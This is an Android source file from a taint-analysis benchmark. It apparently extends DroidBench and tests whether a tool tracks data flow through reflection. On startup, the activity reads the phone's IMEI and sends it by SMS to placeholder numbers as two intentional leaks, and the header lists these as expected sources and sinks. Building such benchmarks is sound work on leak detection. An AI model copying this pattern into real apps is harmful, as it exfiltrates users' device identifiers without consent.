package ubc.yingying.reflection2test6;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;



/**
 * @Description The benchmark is an extension of DroidBench-Reflection-Reflection2 and UBCBench-Reflection2test2.
 *
 * When there are two derived class from different base class, the tool should be able to distinguish them during reflection
 *
 * (Specific to this testcase, the tool should know ConcreteClass1 is derived from BaseClass and ConcreteClass3 is
 * derived from BaseClass2, then match the two sources to the correct sink)
 *
 * @ExpectedSources:
 * line 53: getDeviceId()
 * line 57: getDeviceId()
 *
 * @ExpectedSinks:
 * line 54: [leak] sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)
 * line 58: [leak] sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)
 *
 * @NumberOfExpectedLeaks: 2
 *
 * @FlowPaths:
 * Path1:
 * line 53: bc1.imei = telephonyManager.getDeviceId(); -->
 * line 54: sms.sendTextMessage("+49 1111", null, bc1.foo(),null,null);  --> leak
 *
 * Path2:
 * line 53: bc3.imei = telephonyManager.getDeviceId(); -->
 * line 54: sms.sendTextMessage("+49 3333", null, bc3.foo(),null,null);  --> leak
 *
 */

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        try {

            TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            SmsManager sms = SmsManager.getDefault();

            BaseClass bc1 = (BaseClass) Class.forName("ubc.yingying.reflection2test6.ConcreteClass1").newInstance();
            bc1.imei = telephonyManager.getDeviceId(); // source
            sms.sendTextMessage("+49 1111", null, bc1.foo(), null,null); // sink, leak

            BaseClass2 bc3 = (BaseClass2) Class.forName("ubc.yingying.reflection2test6.ConcreteClass3").newInstance();
            bc3.imei = telephonyManager.getDeviceId(); // source
            sms.sendTextMessage("+49 3333", null, bc3.foo(),null,null);  // sink, leak



        } catch (InstantiationException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }




}
